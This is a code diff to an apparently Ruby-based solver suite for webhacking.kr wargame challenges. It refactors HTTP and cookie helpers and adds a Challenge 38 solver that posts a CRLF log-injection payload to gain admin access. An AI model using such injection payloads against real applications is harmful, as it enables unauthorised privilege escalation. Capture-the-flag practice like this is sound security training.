@@ -10,6 +10,9 @@ module WebhackingKR
   class ChallengeBase
     DATA_DIR = File.join(__dir__, '..', '..', 'data')
 
+    OPENDNS_RESOLVER = 'resolver1.opendns.com'
+    OPENDNS_MYIP = 'myip.opendns.com'
+
     @@successors = []
 
     class << self
@@ -78,37 +81,60 @@ module WebhackingKR
 
     ##
     # Starts HTTP connection
-    def start
+    def http_start
       @client.start { yield if block_given? }
     end
 
     ##
     # Sends HTTP GET request
     def get(query, headers = {})
-      cookie = headers['Cookie']
-      headers['Cookie'] = @wargame.session_id
-      headers['Cookie'] << "; #{cookie}" if cookie
+      headers['Cookie'] = join_cookie(headers['Cookie'])
       request = Net::HTTP::Get.new(query, headers)
-      @client.request(request)
+      begin
+        @client.request(request)
+      rescue StandardError => e
+        raise HTTPError, e
+      end
     end
 
     ##
     # Sends HTTP POST request
     def post(query, data = {}, headers = {})
-      cookie = headers['Cookie']
-      headers['Cookie'] = @wargame.session_id
-      headers['Cookie'] << "; #{cookie}" if cookie
+      headers['Cookie'] = join_cookie(headers['Cookie'])
       request = Net::HTTP::Post.new(query, headers)
       request.set_form_data(data)
-      @client.request(request)
+      begin
+        @client.request(request)
+      rescue StandardError => e
+        raise HTTPError, e
+      end
     end
 
+    ##
+    # Authenticates the flag
     def auth(flag)
       response = post(
         Wargame::QUERY_AUTH,
         { 'flag' => flag }
       )
       response.body
+    end
+
+    private
+
+    ##
+    # Prepends PHPSESSID to cookie
+    def join_cookie(cookie)
+      data = ["PHPSESSID=#{@wargame.session_id}"]
+      data << cookie if cookie
+      data.join('; ')
+    end
+
+    ##
+    # Determines your own IP address
+    def myip
+      resolver = Resolv::DNS.new(nameserver: OPENDNS_RESOLVER)
+      resolver.getaddress(OPENDNS_MYIP).to_s
     end
   end
 
@@ -376,15 +402,12 @@ module WebhackingKR
     PATH = '/challenge/code-2/'
     QUERY = '?val='
 
-    OPENDNS_RESOLVER = 'resolver1.opendns.com'
-    OPENDNS_MYIP = 'myip.opendns.com'
-
     def exec
       log('Determining your own IP address')
       resolver = Resolv::DNS.new(nameserver: OPENDNS_RESOLVER)
-      myip = resolver.getaddress(OPENDNS_MYIP).to_s
-      log("IP: #{myip}")
-      val = "1abcde_#{myip}\tp\ta\ts\ts"
+      ip = myip
+      log("IP: #{ip}")
+      val = "1abcde_#{ip}\tp\ta\ts\ts"
       val = URI.encode_www_form_component(val)
       log("Sending value: #{val}")
       response = get("#{PATH}#{QUERY}#{val}")
@@ -500,7 +523,7 @@ module WebhackingKR
     PATH = '/challenge/code-4/'
 
     def exec
-      start do
+      http_start do
         log('Getting page')
         response = get(PATH)
         match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
@@ -684,6 +707,33 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 38
+  class Challenge38 < ChallengeBase
+    CHALLENGE = 38
+
+    PATH = '/challenge/bonus-9/'
+    PATH_ADMIN = "#{PATH}admin.php"
+    PARAM_ID = 'id'
+    PAYLOAD = "tester\r\n$IP$:admin"
+
+    def exec
+      log('Determining your own IP address')
+      ip = myip
+      log("IP: #{ip}")
+      payload = PAYLOAD.sub('$IP$', ip)
+      log('Sending payload')
+      post(
+        PATH,
+        { PARAM_ID => payload }
+      )
+
+      log('Getting admin page')
+      response = get(PATH_ADMIN)
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 54
   class Challenge54 < ChallengeBase
     CHALLENGE = 54
@@ -728,7 +778,7 @@ module WebhackingKR
 
     def exec
       log('Registering the ID')
-      response = post(
+      post(
         PATH,
         {
           PARAM_ID => ID,
